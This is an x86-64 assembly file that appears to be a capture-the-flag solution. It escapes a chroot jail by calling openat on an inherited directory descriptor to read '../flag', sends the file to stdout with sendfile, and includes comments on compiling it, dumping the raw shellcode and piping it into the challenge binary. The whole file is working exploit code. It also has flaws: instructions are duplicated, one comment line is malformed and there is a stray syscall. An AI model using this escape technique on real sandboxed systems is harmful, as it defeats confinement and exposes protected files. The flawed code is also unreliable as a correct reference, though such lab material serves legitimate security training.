.global _start
.intel_syntax noprefix
_start:
        // calling openat(3 (outside of jail dirfd, "../flag", 0 (read-only))
				
        mov rax, 257
        mov rdi, 3
        mov rax, 257
        mov rdi, 3
        lea rsi, [rip+path]
        mov rdx, 0
        syscall
				
        // sendfile(1, flag_fd, 0, 1024)
				
        mov rdi, 1
        mov rsi, rax
        mov rdx, 0
        mov r10, 1024
        mov rax, 40
        syscall
				
	/exit cleanly
				
        syscall
        mov rax, 60
        syscall

path:
        .string "../flag"

// compile with `gcc -nostdlib -static -o solution-elf solution.s`
// then dump the raw shellcode `objcopy --dump-section .text=solution-raw solution-elf`
// after that it can be redirected into the target challenge with cat
// cat solution-raw | ./mini_jail_easy_1 /an_existing_folder
// another folder is necessary in the directory where the challenge is located. 
// escaping from chroot requires another directory.
// The code will use the syscall openat to open the directory outside of the jail.
